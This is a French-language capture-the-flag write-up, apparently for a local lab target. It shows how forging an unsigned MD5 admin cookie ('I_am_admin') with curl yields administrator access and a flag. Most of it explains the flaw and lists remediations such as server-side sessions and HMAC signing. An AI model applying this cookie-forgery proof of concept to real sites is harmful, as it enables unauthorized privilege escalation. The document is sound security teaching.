# Analyse de vulnérabilité — Cookie d’élévation de privilèges (`I_am_admin`)

## Contexte
CTF autorisé — cible :  
`http://192.168.64.3/index.php?page=redirect&site=http://example.com`

L’analyse montre qu’un cookie nommé `I_am_admin` contient une valeur **MD5** correspondant au statut administrateur (`false` ou `true`).  
En modifiant ce cookie côté client (navigateur ou requête HTTP), il est possible d’obtenir un accès administrateur et de récupérer la flag.

---

## 1) Découverte et reproduction de la faille

### Observation initiale
Récupération des en-têtes HTTP afin d’identifier les cookies :
```bash
curl -sI "http://192.168.64.3/index.php?page=redirect&site=http://example.com" | grep -i '^Set-Cookie:'
```

Résultat :
```
Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; ...
```

La valeur `68934a3e9455fa72420237eb05902327` correspond à `md5("false")`.

---

### Hypothèse
Le serveur semble déterminer les privilèges administrateur à partir d’un cookie client, dont la valeur est simplement le hash MD5 du texte `"true"` ou `"false"`.  
Si le serveur fait confiance à ce cookie sans vérification supplémentaire, remplacer la valeur par `md5("true")` devrait accorder les droits administrateur.

---

### Test pratique (preuve de concept)
Remplacement du cookie par `md5("true")` :
```bash
curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
```

Réponse (extrait) :
```
Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
```

La modification du cookie permet donc bien une élévation de privilèges.

---

## 2) Explication technique de la vulnérabilité

### Description synthétique
Le site stocke un indicateur d’autorisation (`I_am_admin`) **côté client**, sous forme d’un hash MD5 de la chaîne `"true"` ou `"false"`.  
Le serveur utilise directement cette valeur pour décider si l’utilisateur est administrateur.

---

### Pourquoi ce mécanisme est vulnérable
- **Confiance excessive dans le client**  
  Les cookies sont entièrement contrôlables par l’utilisateur. Tout contrôle d’accès fondé uniquement sur un cookie client est falsifiable.

- **Absence d’intégrité cryptographique**  
  Un simple hash (`MD5(payload)`) sans clé secrète n’assure aucune protection contre la modification.

- **MD5 obsolète**  
  MD5 n’est plus considéré sûr (collisions, rapidité excessive).  
  Toutefois, le problème principal ici est surtout l’absence de signature, pas seulement l’algorithme utilisé.

- **Mauvaise conception de l’authentification**  
  Les droits doivent être évalués à partir d’une source serveur de confiance (session, base de données), pas d’un indicateur client.

---

## 3) Impact

- **Élévation de privilèges** : tout utilisateur peut devenir administrateur.
- **Compromission de la confidentialité et de l’intégrité** : accès à des fonctionnalités et données sensibles.
- **Surface d’attaque critique** : possibilité de modification du système, d’autres comptes ou de données protégées.

Sévérité : **élevée**, car l’attaque est triviale et ne nécessite aucune authentification préalable.

---

## 4) Preuve de concept (commande utile)

```bash
curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
```

---

## 5) Correctifs et bonnes pratiques

### 5.1 Solution recommandée — sessions côté serveur
- Ne stocker **aucun droit d’accès** côté client.
- Conserver l’identité utilisateur et les rôles **côté serveur** (session, base de données, Redis…).
- Le cookie client ne doit contenir qu’un identifiant de session opaque.
- Attributs recommandés pour le cookie :
  - `HttpOnly`
  - `Secure`
  - `SameSite=Strict`
  - durée de vie limitée

---

### 5.2 Signature cryptographique si stockage client nécessaire
- Utiliser une **MAC** (ex. `HMAC-SHA256`) avec une clé secrète serveur.
- Format recommandé :
  ```
  value = base64(payload) + "." + hex(hmac(secret, payload))
  ```
- Rejeter toute requête dont la signature est invalide.
- Ne jamais utiliser un hash simple (`md5(payload)`).

---

### 5.3 Utilisation correcte des JWT (si architecture stateless)
- JWT signé (`HS256` ou `RS256`).
- Vérification stricte de :
  - `iss` (issuer)
  - `aud` (audience)
  - `exp` (expiration)
- Prévoir un mécanisme de révocation ou une durée de vie courte.

---

### 5.4 Mesures de durcissement complémentaires
- Journalisation des tentatives de falsification de cookies.
- Alertes sur signatures invalides.
- Rotation régulière des clés secrètes.
- Tests automatisés des contrôles d’accès.
- Principe de minimisation des données stockées côté client.

---

## Conclusion
Cette faille illustre un cas classique d’**élévation de privilèges par confiance dans des données client**.  
Même avec un hash, un cookie non signé et interprété côté serveur ne constitue pas un mécanisme de sécurité.  
La seule approche fiable repose sur des contrôles d’accès côté serveur et des mécanismes d’authentification correctement conçus.
